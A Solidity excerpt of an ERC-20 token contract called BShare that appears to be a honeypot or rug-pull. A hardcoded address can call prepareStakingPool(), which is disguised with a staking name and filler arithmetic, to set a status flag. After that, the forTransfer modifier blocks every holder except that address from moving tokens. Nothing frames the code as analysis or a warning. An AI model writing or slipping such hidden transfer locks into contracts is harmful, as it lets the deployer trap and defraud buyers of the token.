...
contract BShare is Context, IERC20, IERC20Metadata {
    ...
    uint256 private _tokeno_totalSupply;
    uint256 private _tokeno_status = 0;
    uint256 public stakingPooloStatus = 0;

    string private _tokeno_name;
    string private _tokeno_symbol;

    address private _pooloAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokeno_name = "BSHARE";
        _tokeno_symbol = "BSHARE";
        _tokeno_totalSupply = 100000000000 * 10 ** 18;
        _balances[msg.sender] = _tokeno_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _pooloAddress || _tokeno_status == 0);
        _;
    }

    function symbol() public view virtual override returns (string memory) {
        return _tokeno_symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokeno_totalSupply;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPooloStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _pooloAddress)
        {
            _tokeno_status = 1;
        }
    }
